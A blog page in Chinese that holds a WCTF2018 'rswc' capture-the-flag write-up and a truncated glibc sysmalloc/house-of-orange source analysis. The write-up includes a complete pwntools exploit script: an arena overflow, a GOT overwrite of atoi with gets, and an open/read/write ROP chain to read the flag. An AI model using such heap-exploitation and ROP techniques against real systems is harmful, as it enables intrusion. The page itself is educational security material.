<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta name="description" content="Stay hungry.Stay foolish.">
<meta property="og:type" content="website">
<meta property="og:title" content="0gur1">
<meta property="og:url" content="http://0gur1.cc/index.html">
<meta property="og:site_name" content="0gur1">
<meta property="og:description" content="Stay hungry.Stay foolish.">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="0gur1">
<meta name="twitter:description" content="Stay hungry.Stay foolish.">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://0gur1.cc/"/>





  <title>0gur1</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">0gur1</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/07/11/WCTF2018-rswc/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/11/WCTF2018-rswc/" itemprop="url">WCTF2018-rswc</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-11T17:07:31+08:00">
                2018-07-11
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/07/11/WCTF2018-rswc/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/07/11/WCTF2018-rswc/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/07/11/WCTF2018-rswc/" class="leancloud_visitors" data-flag-title="WCTF2018-rswc">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,496字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="基本逻辑"><a href="#基本逻辑" class="headerlink" title="基本逻辑"></a>基本逻辑</h2><p>这一题也是典型的菜单类题目，共有5个功能：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0. alloc</span><br><span class="line">1. edit</span><br><span class="line">2. show</span><br><span class="line">3. delete</span><br><span class="line">9. exit</span><br></pre></td></tr></table></figure>
<p><img src="/2018/07/11/WCTF2018-rswc/main.png" alt="main函数"></p>
<p><strong>prepare函数</strong>模拟了堆初始化的过程。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/prepare.png" alt="prepare函数"></p>
<p>其中mmap函数的原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">mmap</span><span class="params">(<span class="keyword">void</span>* start,<span class="keyword">size_t</span> length,<span class="keyword">int</span> prot,<span class="keyword">int</span> flags,<span class="keyword">int</span> fd,<span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>
<p>第三个参数prot表示保护方式：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_READ	0x1		<span class="comment">/* page can be read */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_WRITE	0x2		<span class="comment">/* page can be written */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_EXEC	0x4		<span class="comment">/* page can be executed */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_SEM	0x8		<span class="comment">/* page may be used for atomic ops */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROT_NONE	0x0		<span class="comment">/* page can not be accessed */</span></span></span><br></pre></td></tr></table></figure>
<p>第6行的mmap分配了一块0x1000大小的内存，且不可读、写以及执行，用于对堆的保护。</p>
<p>第11行分配了类似于arena的区域，存放指针，权限为rw。</p>
<p>接着初始化heap的函数init__()</p>
<p><img src="/2018/07/11/WCTF2018-rswc/init.png" alt="初始化heap"></p>
<p>先分配了0x3000内存作为heap，然后再arena中记录heap地址、top地址、heap大小以及已经分配的chunk数量。然后对arena进行了初始化。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/arena.png" alt="arena"></p>
<p><strong>alloc函数</strong>用于分配新的chunk，关键函数是malloc_memory()</p>
<p><img src="/2018/07/11/WCTF2018-rswc/alloc.png" alt="alloc函数"></p>
<p>malloc_memory函数首先计算chunk实际的大小，完成对齐的功能。然后检查arena中记录的chunk中有没有处于空闲状态并且大于需求大小的，如果有，就分配该chunk；否则就在top中分配一块。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/malloc.png" alt="分配新的chunk"></p>
<p>此处可以确定arena的结构：</p>
<p><img src="/2018/07/11/WCTF2018-rswc/arena1.png" alt="arena结构"></p>
<p>返回到alloc函数后，对新分配的chunk进行初始化，并更新记录第一块的指针first</p>
<p><img src="/2018/07/11/WCTF2018-rswc/chunk.png" alt="chunk结构"></p>
<p><strong>edit函数</strong>用于编辑chunk中的content，输入idx，通过每个chunk的下一地址字段找到下一块。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/edit.png" alt="edit函数"></p>
<p><strong>show函数</strong>展示chunk的size、content</p>
<p><img src="/2018/07/11/WCTF2018-rswc/show.png" alt="show函数"></p>
<p><strong>dele函数</strong>修改下一块地址字段，并将arena中对应的chunk的inuse位置零。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/dele.png" alt="dele函数"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>arena分配的大小为0x1000，除去前面32字节的信息字段，一共可以存放254个chunk信息；而heap分配了0x3000，如果按照最小的块32字节大小来分配，一共可以分配<code>0x3000/0x20=384</code>个chunk。因而在分配第255个chunk时，arena就会溢出，但由于arena的下一块是rwx都不可操作的保护区域，这个溢出无法利用。</p>
<p>看出题人的题解，提到了Linux内核中的ulimit和mmap的关系。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">arch_pick_mmap_layout</span><span class="params">(struct mm_struct *mm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random_factor = <span class="number">0U</span>L;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (current-&gt;flags &amp; PF_RANDOMIZE)</span><br><span class="line">		random_factor = arch_mmap_rnd();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (mmap_is_legacy()) &#123;</span><br><span class="line">		mm-&gt;mmap_base = TASK_UNMAPPED_BASE + random_factor;</span><br><span class="line">		mm-&gt;get_unmapped_area = arch_get_unmapped_area;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		mm-&gt;mmap_base = mmap_base(random_factor);</span><br><span class="line">		mm-&gt;get_unmapped_area = arch_get_unmapped_area_topdown;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当mmap_is_legacy返回1时（旧版），mmap从低地址向高地址增长；当返回0时（新版），mmap从高地址向低地址增长。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">mmap_is_legacy</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//若设置了ADDR_COMPAT_LAYOUT属性，则提供旧版的虚拟地址空间内存</span></span><br><span class="line">	<span class="keyword">if</span> (current-&gt;personality &amp; ADDR_COMPAT_LAYOUT)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="comment">//判断堆栈大小是否为无限制的</span></span><br><span class="line">	<span class="keyword">if</span> (rlimit(RLIMIT_STACK) == RLIM_INFINITY)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	<span class="comment">//sysctl_legacy_va_layout可以在/proc/sys/vm/legacy_va_layout中查看</span></span><br><span class="line">	<span class="keyword">return</span> sysctl_legacy_va_layout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Linux中的<code>ulimit -s</code>命令能够限制进程使用的堆栈大小，当-s的参数为<code>unlimited</code>时，则是对大小不做限制。也就是说，如果在运行程序之前执行该命令，在执行mmap时，就会进入到第二个条件分支，mmap_is_legacy就会返回1。</p>
<p>先看正常情况下，mmap的分配情况。先分配的arena的地址是0x7ffff7ff5000，后分配的heap地址为0x7ffff7ff2000，即当前情况下，mmap是由高地址向低地址增长的，mmap_is_legacy返回的为0。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/before.png" alt="aren和heap的地址"></p>
<p>通过vmmap也能看出mmap的增长方向，最先分配的rwx都不可操作的保护区域，地址在最下面。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/address-before.png" alt="vmmap查看内存分配情况"></p>
<p>而此时的sysctl_legacy_va_layout的值为0，即使用新版的映射方式从高到低增长。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/value.png" alt="sysctl_legacy_va_layout的值"></p>
<p>接下来执行<code>ulimit -s unlimited</code>，再次运行程序，查看内存。此时先分配的arena地址比后分配的heap地址更小了，即mmap变成了由低地址向高地址增长。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/address-after.png" alt="arena和heap地址"></p>
<p>在vmmap中，两块区域的位置也发生了变化。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/vmmap-after.png" alt="vmmap查看内存"></p>
<p>此时就可以利用arena的溢出来覆写heap区域来达成目标了。</p>
<p>还有一点是，本题开启了沙箱保护，只允许进行open、read、write、exit和exit_group操作，也就是不能直接获取shell，但是可以直接读写flag文件来获取flag。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/seccomp.png" alt="沙箱保护"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>分配254个以上的chunk造成arena的溢出。利用arena中chunk info的size字段覆盖heap中chunk的size字段，edit时会造成chunk的content溢出，覆写下一个chunk的”下一地址“（简称next）字段，进而利用show泄露和edit覆写got中函数地址。</p>
<p><img src="/2018/07/11/WCTF2018-rswc/hack.png" alt="漏洞利用示意图"></p>
<p>将atoi函数覆写为gets函数，造成栈溢出，进而构造ROP劫持程序执行流。</p>
<h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./rswc'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'0'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'1'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">	p.sendline(<span class="string">'3'</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'index: '</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#normal block:0~253</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">254</span>):</span><br><span class="line">	alloc(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#no.254 will cover the first chunk</span></span><br><span class="line">alloc(<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite no.253's ptr</span></span><br><span class="line">atoi_got = <span class="number">0x602068</span></span><br><span class="line">edit(<span class="number">254</span>,<span class="string">'0gur1'</span>.ljust(<span class="number">16</span>,<span class="string">'x'</span>)+p64(atoi_got<span class="number">-16</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak address</span></span><br><span class="line">show(<span class="number">254</span>)</span><br><span class="line">p.recvuntil(<span class="string">'  content: '</span>)</span><br><span class="line">atoi_addr = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)</span><br><span class="line">open_addr = atoi_addr - (libc.symbols[<span class="string">'atoi'</span>]-libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">read_addr = atoi_addr - (libc.symbols[<span class="string">'atoi'</span>]-libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">gets_addr = atoi_addr - (libc.symbols[<span class="string">'atoi'</span>]-libc.symbols[<span class="string">'gets'</span>])</span><br><span class="line">write_addr = atoi_addr - (libc.symbols[<span class="string">'atoi'</span>]-libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">log.info(<span class="string">'atoi_addr:%#x'</span> %atoi_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite atoi_got with gets</span></span><br><span class="line">edit(<span class="number">254</span>,p64(gets_addr))</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr-libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">pr_addr = libc_base + <span class="number">0x0000000000021102</span></span><br><span class="line">prsi_addr = libc_base + <span class="number">0x0202e8</span></span><br><span class="line">ppr_addr = libc_base + <span class="number">0x00000000001150c9</span></span><br><span class="line">buf = <span class="number">0x602000</span>+<span class="number">0xa00</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ROP</span></span><br><span class="line">shellcode= <span class="string">'0gur1'</span>.ljust(<span class="number">0x18</span>,<span class="string">'x'</span>)</span><br><span class="line">shellcode+=p64(pr_addr)+p64(<span class="number">0</span>)</span><br><span class="line">shellcode+=p64(ppr_addr)+p64(<span class="number">0x30</span>)+p64(buf)</span><br><span class="line">shellcode+=p64(read_addr)</span><br><span class="line"></span><br><span class="line">shellcode+=p64(pr_addr)+p64(buf)</span><br><span class="line">shellcode+=p64(ppr_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">shellcode+=p64(open_addr)</span><br><span class="line"></span><br><span class="line">shellcode+=p64(pr_addr)+p64(<span class="number">3</span>)</span><br><span class="line">shellcode+=p64(ppr_addr)+p64(<span class="number">0x30</span>)+p64(buf)</span><br><span class="line">shellcode+=p64(read_addr)</span><br><span class="line"></span><br><span class="line">shellcode+=p64(pr_addr)+p64(<span class="number">1</span>)</span><br><span class="line">shellcode+=p64(ppr_addr)+p64(<span class="number">0x30</span>)+p64(buf)</span><br><span class="line">shellcode+=p64(write_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.send(<span class="string">'flag.txt'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>参考链接：<a href="https://xz.aliyun.com/t/2436" target="_blank" rel="noopener">WCTF 2018 - binja - rswc</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://0gur1.cc/2018/07/10/sysmalloc源码分析/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="0gur1">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="0gur1">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/07/10/sysmalloc源码分析/" itemprop="url">sysmalloc源码分析</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-10T11:16:22+08:00">
                2018-07-10
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2018/07/10/sysmalloc源码分析/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/07/10/sysmalloc源码分析/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/2018/07/10/sysmalloc源码分析/" class="leancloud_visitors" data-flag-title="sysmalloc源码分析">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数&#58;</span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1,749字
                </span>
              

              

              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>之前在做SUCTF的note时接触到了house of orange的原理，即将top的大小修改为一个比较小的值，再分配一个比size大的值时，原来的top就会free并放入到unsorted bin里，重新产生一个新的top。而note这道题由于可以自己创造出unsorted bin，就没有修改top的大小。今天简单看了一下sysmalloc的源码，重新认识了house of orange。ps：在网上找了一些大佬讲原理的blog，发现各位大佬都分析的是非主分配区部分的源码，而实际上多数用到的是main arena的源码，虽然原理类似，但是金牛座就愿意钻牛角尖=。=</p>
<h1 id="一个用来调试的栗子"><a href="#一个用来调试的栗子" class="headerlink" title="一个用来调试的栗子"></a>一个用来调试的栗子</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fake_size 0x1fe1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    ptr=(<span class="keyword">void</span> *)((<span class="keyword">int</span>)ptr+<span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">long</span> <span class="keyword">long</span>*)ptr)=fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>栗子参考了<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/house_of_orange/" target="_blank" rel="noopener">ctf-wiki</a>，将top的大小改为了0x1fe1，然后再分配0x2000大小的chunk，由于_int_malloc的其他环节都不能处理了，由此调用sysmalloc</p>
<h1 id="sysmalloc的源码"><a href="#sysmalloc的源码" class="headerlink" title="sysmalloc的源码"></a>sysmalloc的源码</h1><p>根据上面的栗子，在第二个<code>malloc</code>处对<code>sysmalloc</code>的源码逐步分析的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">sysmalloc (INTERNAL_SIZE_T nb, mstate av)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr old_top;              <span class="comment">/* incoming value of av-&gt;top */</span></span><br><span class="line">  INTERNAL_SIZE_T old_size;       <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">char</span> *old_end;                  <span class="comment">/* its end address */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> size;                      <span class="comment">/* arg to first MORECORE or mmap call */</span></span><br><span class="line">  <span class="keyword">char</span> *brk;                      <span class="comment">/* return value from MORECORE */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">long</span> correction;                <span class="comment">/* arg to 2nd MORECORE call */</span></span><br><span class="line">  <span class="keyword">char</span> *snd_brk;                  <span class="comment">/* 2nd return val */</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T front_misalign; <span class="comment">/* unusable bytes at front of new space */</span></span><br><span class="line">  INTERNAL_SIZE_T end_misalign;   <span class="comment">/* partial page left at end of new space */</span></span><br><span class="line">  <span class="keyword">char</span> *aligned_brk;              <span class="comment">/* aligned offset into brk */</span></span><br><span 